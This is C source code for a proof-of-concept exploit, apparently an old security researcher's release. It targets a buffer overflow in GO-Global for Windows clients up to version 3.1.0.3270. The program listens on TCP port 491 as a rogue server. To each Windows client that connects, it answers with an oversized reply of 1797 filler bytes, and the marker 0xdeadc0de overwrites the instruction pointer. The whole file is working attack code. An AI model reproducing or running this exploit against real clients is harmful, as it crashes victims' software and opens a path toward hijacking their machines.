/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define PORT    491
#define BOFSZ   1797



void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sdl,
            sda,
            i,
            on = 1,
            psz;
    u_char  buff[BOFSZ + 64],   // bof??? this is only a PoC...
            *p;

#ifdef WIN32
    WSADATA wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "GO-Global for Windows clients <= 3.1.0.3270 buffer-overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    peer.sin_addr.s_addr = INADDR_ANY;
    peer.sin_port        = htons(PORT);
    peer.sin_family      = AF_INET;
    psz                  = sizeof(peer);

    printf("- bind port %hu\n", PORT);
    sdl = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sdl < 0) std_err();
    if(setsockopt(sdl, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
      < 0) std_err();
    if(bind(sdl, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(listen(sdl, SOMAXCONN)
      < 0) std_err();

    fputs("- wait clients:\n", stdout);
    for(;;) {
        sda = accept(sdl, (struct sockaddr *)&peer, &psz);
        if(sda < 0) std_err();

        printf("- exploiting %s:%hu\n",
            inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

        p = buff;
        recv(sda, p, 1, 0);
        if(*p == '_') { // windows client
            do {
                recv(sda, ++p, 1, 0);
            } while(*p != '_');
        } else {        // unix client (not vulnerable)
            fputs("- GO-Global for Unix clients are not vulnerable\n", stdout);
            for(i = 1; i < 6; i++) {
                recv(sda, ++p, 1, 0);
            }
        }
        p++;

        // buff already contains the data to send back!
        *(u_short *)p = htons(BOFSZ);   // seems not needed
        p += 2;
        memset(p, 'a', BOFSZ);
        *(u_int *)(p + BOFSZ - 6) = 0xdeadc0de; // EIP
        p += BOFSZ;
        send(sda, buff, p - buff, 0);

        recv(sda, buff, sizeof(buff), 0);

        close(sda);
    }

    close(sdl);
    return(0);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


